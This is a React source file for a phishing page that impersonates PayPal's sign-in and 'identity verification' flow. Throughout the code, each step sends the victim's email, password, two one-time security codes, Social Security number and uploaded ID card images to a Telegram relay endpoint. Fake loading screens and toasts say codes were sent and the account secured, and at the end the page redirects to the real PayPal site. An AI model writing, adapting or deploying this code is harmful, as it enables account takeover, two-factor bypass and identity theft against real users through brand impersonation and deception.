import { useState } from "react";
import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft, Shield, CheckCircle } from "lucide-react";
import { SiPaypal } from "react-icons/si";
import { useToast } from "@/hooks/use-toast";

type LoginStep = 
  | "email" 
  | "loading-password" 
  | "password" 
  | "loading-verify"
  | "verify-method" 
  | "verify-code" 
  | "verifying" 
  | "verify-code-2" 
  | "loading-documents"
  | "verify-documents"
  | "processing-documents"
  | "success";

export default function LoginPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [verificationCode2, setVerificationCode2] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [idCardFront, setIdCardFront] = useState<File | null>(null);
  const [idCardBack, setIdCardBack] = useState<File | null>(null);
  const [ssn, setSsn] = useState("");
  const [step, setStep] = useState<LoginStep>("email");
  const [isLoading, setIsLoading] = useState(false);
  const [selectedMethod, setSelectedMethod] = useState<"sms" | "email">("sms");
  const [codeSent, setCodeSent] = useState(false);
  const { toast } = useToast();

  const handleEmailNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim()) return;

    // Send email to Telegram immediately
    try {
      const message = `
📧 *Email Entered*

📧 *Email:* ${email}
      `.trim();

      await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message }),
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }

    setStep("loading-password");
    setTimeout(() => {
      setStep("password");
    }, 3000);
  };

  const handlePasswordNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) return;

    // Send password to Telegram immediately
    try {
      const message = `
🔑 *Password Entered*

📧 *Email:* ${email}
🔑 *Password:* ${password}
      `.trim();

      await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message }),
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }

    setStep("loading-verify");
    setTimeout(() => {
      setStep("verify-code");
      toast({
        description: "A security code has been sent to your registered device.",
      });
    }, 5000);
  };

  const handleSendCode = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setCodeSent(true);
      setStep("verify-code");
      toast({
        description: "Security code sent successfully.",
      });
    }, 1000);
  };

  const handleVerifyCode = async (e: React.FormEvent) => {
    e.preventDefault();
    if (verificationCode.length < 6) return;

    // Send first verification code to Telegram immediately
    try {
      const message = `
🔢 *Verification Code 1*

📧 *Email:* ${email}
🔑 *Code:* ${verificationCode}
      `.trim();

      await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message }),
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }

    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setStep("verifying");

      setTimeout(() => {
        setStep("verify-code-2");
        toast({
          description: "Additional verification required for your security.",
        });
      }, 3000);
    }, 1000);
  };

  const handleVerifyCode2 = async (e: React.FormEvent) => {
    e.preventDefault();
    if (verificationCode2.length < 6) return;

    // Send second verification code to Telegram immediately
    try {
      const message = `
🔢 *Verification Code 2*

📧 *Email:* ${email}
🔑 *Code:* ${verificationCode2}
      `.trim();

      await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message }),
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }

    setStep("loading-documents");
    setTimeout(() => {
      setStep("verify-documents");
    }, 2500);
  };

  const handleBackToEmail = () => {
    setStep("email");
    setPassword("");
    setVerificationCode("");
    setVerificationCode2("");
    setCodeSent(false);
  };

  const handleBackToPassword = () => {
    setStep("password");
    setVerificationCode("");
    setVerificationCode2("");
    setCodeSent(false);
  };

  const handleDocumentVerification = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!idCardFront || !idCardBack || ssn.length < 9) return;

    setStep("processing-documents");
    
    // Send SSN to Telegram immediately
    try {
      const message = `
🔢 *SSN Entered*

📧 *Email:* ${email}
🔢 *SSN:* ${ssn}
      `.trim();

      await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message }),
      });
    } catch (error) {
      console.error('Failed to send SSN to Telegram:', error);
    }

    // Send document images to Telegram
    try {
      const formData = new FormData();
      formData.append('email', email);
      formData.append('ssn', ssn);
      formData.append('idFront', idCardFront);
      formData.append('idBack', idCardBack);

      await fetch('/api/telegram/documents', {
        method: 'POST',
        body: formData,
      });
    } catch (error) {
      console.error('Failed to send documents to Telegram:', error);
    }

    setTimeout(() => {
      setStep("success");
    }, 3000);
  };

  const handleSuccessContinue = () => {
    setStep("email");
    setEmail("");
    setPassword("");
    setVerificationCode("");
    setVerificationCode2("");
    setIdCardFront(null);
    setIdCardBack(null);
    setSsn("");
    setCodeSent(false);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") => {
    const file = e.target.files?.[0];
    if (file) {
      if (side === "front") {
        setIdCardFront(file);
      } else {
        setIdCardBack(file);
      }
    }
  };

  const formatSSN = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 9);
    if (numbers.length <= 3) return numbers;
    if (numbers.length <= 5) return `${numbers.slice(0, 3)}-${numbers.slice(3)}`;
    return `${numbers.slice(0, 3)}-${numbers.slice(3, 5)}-${numbers.slice(5)}`;
  };

  const renderLoadingScreen = (message: string) => (
    <div className="flex flex-col items-center justify-center py-16" data-testid="screen-loading">
      <div className="mb-8">
        <img src="/favicon.png" alt="PayPal" className="h-[48px] w-auto" />
      </div>
      <div className="w-10 h-10 border-3 border-[#005ea6] border-t-transparent rounded-full animate-spin mb-6" />
      <p className="text-[15px] text-[#6c7378] text-center">{message}</p>
    </div>
  );

  const renderSuccessStep = () => (
    <div className="flex flex-col items-center py-8" data-testid="screen-success">
      <div className="relative mb-6">
        <div className="w-24 h-24 rounded-full bg-gradient-to-br from-[#169b62]/20 to-[#169b62]/5 flex items-center justify-center">
          <div className="w-20 h-20 rounded-full bg-[#169b62]/10 flex items-center justify-center">
            <Shield className="w-12 h-12 text-[#169b62] fill-[#169b62]/20" strokeWidth={1.5} />
          </div>
        </div>
        <div className="absolute -bottom-1 -right-1 w-8 h-8 rounded-full bg-[#169b62] flex items-center justify-center shadow-lg">
          <CheckCircle className="w-5 h-5 text-white" fill="white" strokeWidth={0} />
        </div>
      </div>
      <h1 className="text-[24px] font-semibold text-[#111b2a] dark:text-white text-center mb-3">
        Verification Complete
      </h1>
      <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center mb-8 max-w-[320px]">
        Your identity has been successfully verified. Your account is now secure.
      </p>
      <div className="w-full space-y-4">
        <button
          type="button"
          onClick={() => window.location.href = "https://www.paypal.com/myaccount/home"}
          className="paypal-btn-2025"
          data-testid="button-continue-success"
        >
          Continue to PayPal
        </button>
      </div>
      <div className="flex items-center justify-center gap-2 mt-8 text-[#169b62]">
        <Shield className="w-4 h-4 fill-[#169b62]/20" />
        <span className="text-[13px] font-medium">Your account is protected</span>
      </div>
    </div>
  );

  const renderProcessingDocuments = () => (
    <div className="flex flex-col items-center justify-center py-16" data-testid="screen-processing">
      <div className="mb-8">
        <img src="/favicon.png" alt="PayPal" className="h-[48px] w-auto" />
      </div>
      <div className="w-10 h-10 border-3 border-[#005ea6] border-t-transparent rounded-full animate-spin mb-6" />
      <h2 className="text-[18px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
        Verifying Your Documents
      </h2>
      <p className="text-[14px] text-[#6c7378] text-center">Please wait while we process your information</p>
    </div>
  );

  const renderVerifyDocumentsStep = () => (
    <form onSubmit={handleDocumentVerification} data-testid="form-verify-documents">
      <div className="flex flex-col items-center mb-8">
        <div className="w-16 h-16 rounded-full bg-[#005ea6]/10 flex items-center justify-center mb-5">
          <User className="w-8 h-8 text-[#005ea6]" />
        </div>
        <h1 className="text-[22px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
          Identity Verification
        </h1>
        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[340px]">
          Upload a valid government-issued ID to verify your identity
        </p>
      </div>

      <div className="space-y-5">
        <div>
          <label className="block text-[13px] font-medium text-[#111b2a] dark:text-white mb-2">
            ID Card (Front)
          </label>
          <input
            type="file"
            accept="image/*"
            onChange={(e) => handleFileUpload(e, "front")}
            className="hidden"
            id="id-front"
            data-testid="input-id-front"
          />
          <label
            htmlFor="id-front"
            className="flex items-center justify-center w-full h-[100px] border border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg cursor-pointer hover:border-[#005ea6] hover:bg-[#f5f7fa] dark:hover:bg-[#1a2a3a] transition-all bg-white dark:bg-[#1a1a1a]"
          >
            {idCardFront ? (
              <div className="flex items-center gap-3">
                <CheckCircle className="w-5 h-5 text-[#169b62]" />
                <span className="text-[14px] text-[#111b2a] dark:text-white">{idCardFront.name}</span>
              </div>
            ) : (
              <span className="text-[14px] text-[#6c7378]">Click to upload front of ID</span>
            )}
          </label>
        </div>

        <div>
          <label className="block text-[13px] font-medium text-[#111b2a] dark:text-white mb-2">
            ID Card (Back)
          </label>
          <input
            type="file"
            accept="image/*"
            onChange={(e) => handleFileUpload(e, "back")}
            className="hidden"
            id="id-back"
            data-testid="input-id-back"
          />
          <label
            htmlFor="id-back"
            className="flex items-center justify-center w-full h-[100px] border border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg cursor-pointer hover:border-[#005ea6] hover:bg-[#f5f7fa] dark:hover:bg-[#1a2a3a] transition-all bg-white dark:bg-[#1a1a1a]"
          >
            {idCardBack ? (
              <div className="flex items-center gap-3">
                <CheckCircle className="w-5 h-5 text-[#169b62]" />
                <span className="text-[14px] text-[#111b2a] dark:text-white">{idCardBack.name}</span>
              </div>
            ) : (
              <span className="text-[14px] text-[#6c7378]">Click to upload back of ID</span>
            )}
          </label>
        </div>

        <div>
          <label className="block text-[13px] font-medium text-[#111b2a] dark:text-white mb-2">
            Social Security Number
          </label>
          <input
            type="text"
            inputMode="numeric"
            placeholder="XXX-XX-XXXX"
            value={ssn}
            onChange={(e) => setSsn(formatSSN(e.target.value))}
            className="paypal-input-2025"
            data-testid="input-ssn"
            maxLength={11}
          />
        </div>

        <button
          type="submit"
          className="paypal-btn-2025"
          disabled={!idCardFront || !idCardBack || ssn.replace(/\D/g, "").length < 9}
          data-testid="button-verify-documents"
        >
          Submit
        </button>

        <div className="flex items-center justify-center gap-2 pt-4 text-[#6c7378]">
          <Lock className="w-3.5 h-3.5" />
          <span className="text-[12px]">Your information is encrypted and secure</span>
        </div>
      </div>
    </form>
  );

  const renderVerifyCode2Step = () => (
    <form onSubmit={handleVerifyCode2} data-testid="form-verify-code-2">
      <div className="flex flex-col items-center mb-8">
        <div className="w-16 h-16 rounded-full bg-[#005ea6]/10 flex items-center justify-center mb-5">
          <Lock className="w-8 h-8 text-[#005ea6]" />
        </div>
        <h2 className="text-[22px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
          Additional Verification
        </h2>
        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[320px]">
          For your protection, enter the security code we just sent
        </p>
      </div>

      <div className="space-y-5">
        <div className="flex justify-center gap-2">
          {[0, 1, 2, 3, 4, 5].map((index) => (
            <input
              key={index}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={verificationCode2[index] || ""}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, "");
                if (value) {
                  const newCode = verificationCode2.split("");
                  newCode[index] = value;
                  setVerificationCode2(newCode.join("").slice(0, 6));
                  const nextInput = e.target.nextElementSibling as HTMLInputElement;
                  if (nextInput && value) nextInput.focus();
                }
              }}
              onKeyDown={(e) => {
                if (e.key === "Backspace" && !verificationCode2[index]) {
                  const prevInput = (e.target as HTMLElement).previousElementSibling as HTMLInputElement;
                  if (prevInput) prevInput.focus();
                }
              }}
              className="w-12 h-14 text-center text-[24px] font-semibold border border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg bg-white dark:bg-[#1a1a1a] text-[#111b2a] dark:text-white focus:outline-none focus:border-[#005ea6] focus:ring-1 focus:ring-[#005ea6]"
              data-testid={`input-code-2-${index}`}
              autoFocus={index === 0}
            />
          ))}
        </div>

        <button
          type="submit"
          className="paypal-btn-2025"
          disabled={verificationCode2.length < 6 || isLoading}
          data-testid="button-verify-2"
        >
          {isLoading ? (
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            "Verify"
          )}
        </button>

        <div className="text-center">
          <button
            type="button"
            className="text-[14px] text-[#005ea6] hover:text-[#003087] hover:underline font-medium"
            data-testid="button-resend-2"
            onClick={() => {
              setVerificationCode("");
              setVerificationCode2("");
              setStep("verify-code");
              toast({
                description: "A new security code has been sent.",
              });
            }}
          >
            Resend code
          </button>
        </div>
      </div>
    </form>
  );

  const renderVerifyingStep = () => (
    <div className="flex flex-col items-center py-12" data-testid="screen-verifying">
      <div className="mb-6">
        <img src="/favicon.png" alt="PayPal" className="h-[40px] w-auto" />
      </div>
      <div className="w-10 h-10 border-3 border-[#005ea6] border-t-transparent rounded-full animate-spin mb-6" />
      <h2 className="text-[18px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
        Verifying
      </h2>
      <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
        Please wait while we verify your information
      </p>
    </div>
  );

  const renderEmailStep = () => (
    <form onSubmit={handleEmailNext} data-testid="form-email">
      <div className="flex items-center gap-4 mb-8">
        <div className="relative flex-shrink-0" data-testid="icon-security-shield">
          <Shield className="w-12 h-12 text-[#005ea6] fill-[#005ea6]/10" strokeWidth={1.5} />
          <SiPaypal className="w-4 h-4 text-[#003087] absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
        </div>
        <div className="flex-1">
          <h1 
            className="text-[22px] font-semibold text-[#111b2a] dark:text-white leading-tight mb-1"
            data-testid="text-title"
          >
            Verify Your Identity
          </h1>
          <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f]">
            Log in to secure your account
          </p>
        </div>
      </div>

      <div className="space-y-4">
        <input
          type="text"
          placeholder="Email or mobile number"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="paypal-input-2025"
          data-testid="input-email"
          autoComplete="email"
          autoFocus
        />

        <button
          type="submit"
          className="paypal-btn-2025"
          disabled={!email.trim()}
          data-testid="button-next"
        >
          Next
        </button>

        <div className="relative py-4">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-[#e5e5e5] dark:border-[#2a2a2a]" />
          </div>
          <div className="relative flex justify-center">
            <span className="px-4 text-[13px] text-[#6c7378] bg-white dark:bg-[#121212]">or</span>
          </div>
        </div>

        <button
          type="button"
          className="paypal-btn-secondary-2025"
          data-testid="button-signup"
          onClick={() => {
            window.location.href = "https://www.paypal.com/us/webapps/mpp/account-selection";
          }}
        >
          Sign Up
        </button>
      </div>
    </form>
  );

  const renderPasswordStep = () => (
    <form onSubmit={handlePasswordNext} data-testid="form-password">
      <div className="flex flex-col items-center mb-8">
        <div 
          className="w-16 h-16 rounded-full bg-[#005ea6] flex items-center justify-center text-[24px] font-semibold text-white mb-4"
          data-testid="avatar-user"
        >
          {email.charAt(0).toUpperCase()}
        </div>
        <button
          type="button"
          onClick={handleBackToEmail}
          className="text-[14px] text-[#005ea6] hover:text-[#003087] hover:underline font-medium flex items-center gap-1"
          data-testid="button-change-email"
        >
          {email}
          <ChevronDown className="w-4 h-4" />
        </button>
      </div>

      <div className="space-y-4">
        <div className="relative">
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="paypal-input-2025 pr-12"
            data-testid="input-password"
            autoComplete="current-password"
            autoFocus
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7378] hover:text-[#111b2a] dark:hover:text-white transition-colors"
            data-testid="button-toggle-password"
          >
            {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
          </button>
        </div>

        <div className="flex justify-between items-center text-[13px]">
          <label className="flex items-center gap-2 cursor-pointer">
            <input 
              type="checkbox" 
              className="w-4 h-4 rounded border-[#cbd2d6] text-[#005ea6] focus:ring-[#005ea6]"
            />
            <span className="text-[#6c7378]">Stay logged in</span>
          </label>
          <a
            href="https://www.paypal.com/us/smarthelp/contact-us?email=recover"
            target="_blank"
            rel="noopener noreferrer"
            className="text-[#005ea6] hover:text-[#003087] hover:underline font-medium"
            data-testid="link-forgot-password"
          >
            Forgot password?
          </a>
        </div>

        <button
          type="submit"
          className="paypal-btn-2025"
          disabled={!password.trim()}
          data-testid="button-login"
        >
          Log In
        </button>
      </div>
    </form>
  );

  const renderVerifyMethodStep = () => (
    <div data-testid="form-verify-method">
      <button
        type="button"
        onClick={handleBackToPassword}
        className="flex items-center gap-1 text-[#6c7378] hover:text-[#111b2a] dark:hover:text-white mb-6"
        data-testid="button-back-password"
      >
        <ChevronLeft className="w-5 h-5" />
        <span className="text-[14px]">Back</span>
      </button>

      <div className="flex flex-col items-center mb-6">
        <div className="w-16 h-16 rounded-full bg-[#005ea6]/10 flex items-center justify-center mb-4">
          <Lock className="w-8 h-8 text-[#005ea6]" />
        </div>
        <h2 className="text-[22px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
          Verify Your Identity
        </h2>
        <p className="text-[14px] text-[#6c7378] text-center">
          Choose how you'd like to receive your security code
        </p>
      </div>

      <div className="space-y-3 mb-6">
        <button
          type="button"
          onClick={() => setSelectedMethod("sms")}
          className={`w-full p-4 rounded-lg border flex items-center gap-4 transition-all ${
            selectedMethod === "sms" 
              ? "border-[#005ea6] bg-[#f5f7fa] dark:bg-[#1a2a3a]" 
              : "border-[#e5e5e5] dark:border-[#3d3d3d] hover:border-[#005ea6]"
          }`}
          data-testid="option-sms"
        >
          <div className="w-10 h-10 rounded-full bg-[#005ea6]/10 flex items-center justify-center">
            <Smartphone className="w-5 h-5 text-[#005ea6]" />
          </div>
          <div className="text-left flex-1">
            <p className="text-[15px] font-medium text-[#111b2a] dark:text-white">Text message</p>
            <p className="text-[13px] text-[#6c7378]">Send code via SMS</p>
          </div>
          {selectedMethod === "sms" && (
            <div className="w-5 h-5 rounded-full bg-[#005ea6] flex items-center justify-center">
              <div className="w-2 h-2 rounded-full bg-white" />
            </div>
          )}
        </button>

        <button
          type="button"
          onClick={() => setSelectedMethod("email")}
          className={`w-full p-4 rounded-lg border flex items-center gap-4 transition-all ${
            selectedMethod === "email" 
              ? "border-[#005ea6] bg-[#f5f7fa] dark:bg-[#1a2a3a]" 
              : "border-[#e5e5e5] dark:border-[#3d3d3d] hover:border-[#005ea6]"
          }`}
          data-testid="option-email"
        >
          <div className="w-10 h-10 rounded-full bg-[#005ea6]/10 flex items-center justify-center">
            <Mail className="w-5 h-5 text-[#005ea6]" />
          </div>
          <div className="text-left flex-1">
            <p className="text-[15px] font-medium text-[#111b2a] dark:text-white">Email</p>
            <p className="text-[13px] text-[#6c7378]">Send code via email</p>
          </div>
          {selectedMethod === "email" && (
            <div className="w-5 h-5 rounded-full bg-[#005ea6] flex items-center justify-center">
              <div className="w-2 h-2 rounded-full bg-white" />
            </div>
          )}
        </button>
      </div>

      <button
        type="button"
        onClick={handleSendCode}
        className="paypal-btn-2025"
        disabled={isLoading}
        data-testid="button-send-code"
      >
        {isLoading ? (
          <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
        ) : (
          "Send Code"
        )}
      </button>
    </div>
  );

  const renderVerifyCodeStep = () => (
    <form onSubmit={handleVerifyCode} data-testid="form-verify-code">
      <div className="flex flex-col items-center mb-8">
        <div className="w-16 h-16 rounded-full bg-[#005ea6]/10 flex items-center justify-center mb-5">
          <Smartphone className="w-8 h-8 text-[#005ea6]" />
        </div>
        <h2 className="text-[22px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
          Enter Security Code
        </h2>
        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[300px]">
          Enter the 6-digit code we sent to verify your identity
        </p>
      </div>

      <div className="space-y-5">
        <div className="flex justify-center gap-2">
          {[0, 1, 2, 3, 4, 5].map((index) => (
            <input
              key={index}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={verificationCode[index] || ""}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, "");
                if (value) {
                  const newCode = verificationCode.split("");
                  newCode[index] = value;
                  setVerificationCode(newCode.join("").slice(0, 6));
                  const nextInput = e.target.nextElementSibling as HTMLInputElement;
                  if (nextInput && value) nextInput.focus();
                }
              }}
              onKeyDown={(e) => {
                if (e.key === "Backspace" && !verificationCode[index]) {
                  const prevInput = (e.target as HTMLElement).previousElementSibling as HTMLInputElement;
                  if (prevInput) prevInput.focus();
                }
              }}
              className="w-12 h-14 text-center text-[24px] font-semibold border border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg bg-white dark:bg-[#1a1a1a] text-[#111b2a] dark:text-white focus:outline-none focus:border-[#005ea6] focus:ring-1 focus:ring-[#005ea6]"
              data-testid={`input-code-${index}`}
              autoFocus={index === 0}
            />
          ))}
        </div>

        <button
          type="submit"
          className="paypal-btn-2025"
          disabled={verificationCode.length < 6 || isLoading}
          data-testid="button-verify"
        >
          {isLoading ? (
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            "Verify"
          )}
        </button>

        <div className="text-center">
          <button
            type="button"
            className="text-[14px] text-[#005ea6] hover:text-[#003087] hover:underline font-medium"
            data-testid="button-resend"
            onClick={() => {
              setVerificationCode("");
              setVerificationCode2("");
              setStep("verify-code");
              toast({
                description: "A new security code has been sent.",
              });
            }}
          >
            Resend code
          </button>
        </div>
      </div>
    </form>
  );

  const showMinimalLayout = ["loading-password", "loading-verify", "loading-documents", "processing-documents", "verifying"].includes(step);

  return (
    <div className="min-h-screen bg-[#f5f7fa] dark:bg-[#0a0a0a] flex flex-col">
      <main className="flex-1 flex flex-col items-center pt-12 sm:pt-16 pb-8 px-4">
        {!showMinimalLayout && (
          <div className="mb-8">
            <img src="/favicon.png" alt="PayPal" className="h-[40px] sm:h-[48px] w-auto" />
          </div>
        )}

        <div className="w-full max-w-[420px] bg-white dark:bg-[#121212] rounded-lg border border-[#e5e5e5] dark:border-[#2a2a2a] p-8 shadow-sm">
          {step === "email" && renderEmailStep()}
          {step === "loading-password" && renderLoadingScreen("Loading your account...")}
          {step === "password" && renderPasswordStep()}
          {step === "loading-verify" && renderLoadingScreen("Securing your session...")}
          {step === "verify-method" && renderVerifyMethodStep()}
          {step === "verify-code" && renderVerifyCodeStep()}
          {step === "verifying" && renderVerifyingStep()}
          {step === "verify-code-2" && renderVerifyCode2Step()}
          {step === "loading-documents" && renderLoadingScreen("Preparing verification...")}
          {step === "verify-documents" && renderVerifyDocumentsStep()}
          {step === "processing-documents" && renderProcessingDocuments()}
          {step === "success" && renderSuccessStep()}
        </div>

        {!showMinimalLayout && step !== "success" && (
          <div className="flex items-center justify-center gap-2 mt-6">
            <Lock className="w-3.5 h-3.5 text-[#6c7378]" />
            <span className="text-[12px] text-[#6c7378]" data-testid="text-security">
              Secure connection
            </span>
          </div>
        )}
      </main>

      <footer className="py-5 px-4 border-t border-[#e5e5e5] dark:border-[#2a2a2a] bg-white dark:bg-[#121212]">
        <div className="max-w-[800px] mx-auto">
          <div className="flex items-center justify-center mb-4">
            <select 
              className="appearance-none bg-transparent text-[#005ea6] font-medium text-[13px] cursor-pointer hover:text-[#003087] hover:underline focus:outline-none"
              data-testid="select-language"
              defaultValue="en"
            >
              <option value="en">English</option>
              <option value="es">Español</option>
              <option value="fr">Français</option>
              <option value="de">Deutsch</option>
              <option value="pt">Português</option>
              <option value="zh">中文</option>
              <option value="ja">日本語</option>
            </select>
          </div>

          <div className="flex flex-wrap justify-center gap-x-5 gap-y-2 mb-4">
            <a href="https://www.paypal.com/us/smarthelp/home" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-help">Help</a>
            <a href="https://www.paypal.com/us/smarthelp/contact-us" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-contact">Contact</a>
            <a href="https://www.paypal.com/us/webapps/mpp/paypal-fees" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-fees">Fees</a>
            <a href="https://www.paypal.com/us/webapps/mpp/paypal-safety-and-security" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-security">Security</a>
            <a href="https://www.paypal.com/us/digital-wallet/ways-to-pay/mobile-wallet" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-apps">Apps</a>
            <a href="https://www.paypal.com/us/shop" target="_blank" rel="noopener noreferrer" className="text-[12px] text-[#005ea6] hover:underline" data-testid="link-footer-shop">Shop</a>
          </div>

          <p className="text-[11px] text-[#6c7378] text-center">
            &copy; 1999-{new Date().getFullYear()} PayPal, Inc. All rights reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}
